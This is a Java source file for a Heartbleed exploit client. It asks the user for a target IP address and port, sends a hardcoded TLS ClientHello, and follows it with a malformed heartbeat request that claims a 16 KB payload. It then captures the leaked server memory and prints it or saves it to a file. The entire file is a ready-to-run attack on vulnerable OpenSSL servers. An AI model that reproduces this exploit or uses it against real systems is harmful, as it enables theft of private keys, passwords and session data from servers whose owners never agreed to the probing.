
import org.w3c.dom.ls.LSOutput;

import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.sql.SQLOutput;
import java.util.Scanner;
import java.io.*;

public class Heartbleed {

  public static void main(String[] args) throws IOException, InterruptedException {
    /*
    Hex version of heartbleed request:
    Content type = 18
    version = 0302
    packet length = 0003
    heartbleed message type = 1 (request)
    payload length = 4000
   */
    final String HEARTBLEED_REQ = "1803020003014000";

    // Client hello in hex
    final String CLIENT_HELLO =
      "16030200310100002D0302500BAFBBB75AB83EF0AB9AE3F39C6315334137ACFD6C181A2460DC4967C2FD960000040033C01101000000";

    Scanner userInput = new Scanner(System.in);

    System.out.println("Please input an ip address...");
    String ipAddress = userInput.nextLine();

    System.out.println("Please enter a port number...");
    int portNumber = userInput.nextInt();

    System.out.println("Would you like to send the output to file? (y/n)");
    String outputToFile = userInput.nextLine();

    Socket socket = openSocket(ipAddress, portNumber);
    OutputStream outputStream = getOutputStream(socket);
    InputStream inputStream = getInputStream(socket, outputStream);

    System.out.println("Established connection to server.");

    byte[] clientHelloArray = hexToByteArray(CLIENT_HELLO);

    outputStream.write(clientHelloArray);
    outputStream.flush();

    System.out.println("Client hello sent.");

    Thread.sleep(100);

    byte[] serverHello = new byte[50];

    System.out.println("Printing server hello...");

    inputStream.read(serverHello);

    for (byte b : serverHello) {
      System.out.println(b + " ");
    }

    System.out.println("Server Hello received.");

    // Heartbleed packet
    System.out.println("Sending Heartbleed packet...");
    outputStream.write(hexToByteArray(HEARTBLEED_REQ));
    outputStream.flush();
    System.out.println("Sent.");

    System.out.println("Waiting for heartbleed packet...");
    Thread.sleep(1000);

    byte[] output = new byte[65535];

    while (inputStream.available() > 1 && inputStream.read(output) != -1) {

      if(!(outputToFile.equals("y") || outputToFile.equals("Y"))) {
        System.out.println(new String(output, StandardCharsets.UTF_8));
      } else {
        try {
          FileWriter fileWriter = new FileWriter("HeartbleedOutput.txt");

          for (int x = 0; x < output.length; x++) {
             fileWriter.write(byteToHex(output[x]) + " ");
          }

          fileWriter.close();
          System.out.println("Successfully wrote to file.");
        } catch (IOException e) {
          System.out.println("An error occurred: "+ e.getMessage());
        }
      }
    }

    Thread.sleep(3000); // wait while heartbleed packets are sent

    userInput.close();
    inputStream.close();
    outputStream.close();
  }

  private static String byteToHex(byte toConv) {
    // Create string with  at least 2 digits, prepend it with 0's if there's less
    return String.format("%02X", toConv);
  }

  private static byte[] hexToByteArray(String hexString) {
    int hexLength = hexString.length();
    byte[] data = new byte[hexLength / 2];

    for (int i = 0; i < hexLength; i += 2) {
      data[i / 2] = (byte) ((Character.digit(hexString.charAt(i), 16) << 4)
        + Character.digit(hexString.charAt(i+1), 16));
    }

    return data;
  }

  private static InputStream getInputStream(Socket socket, OutputStream outputStream) throws IOException {

    InputStream inputStream = null;

    try {

      inputStream = socket.getInputStream();

    } catch (Exception ex) {

      System.out.println("Could not receive input stream: " + ex.getMessage());
      socket.close();
      inputStream.close();
      outputStream.close();
      System.exit(0);
    }

    return inputStream;
  }

  private static OutputStream getOutputStream(Socket socket) throws IOException {

    OutputStream outputStream = null;

    try {

      outputStream = socket.getOutputStream();

    } catch (Exception ex) {

      System.out.println("Could not receive output stream: " + ex.getMessage());
      socket.close();
      System.exit(0);
    }

    return outputStream;
  }

  private static Socket openSocket(String ipAddress, int portNumber) throws IOException {

    Socket socket = null;

    try {
      socket = new Socket(ipAddress, portNumber);
    } catch (Exception ex) {

      System.out.println("Socket could not connect. Reason: " + ex.getMessage());
      socket.close();
      System.exit(0);
    }

    return socket;
  }
}
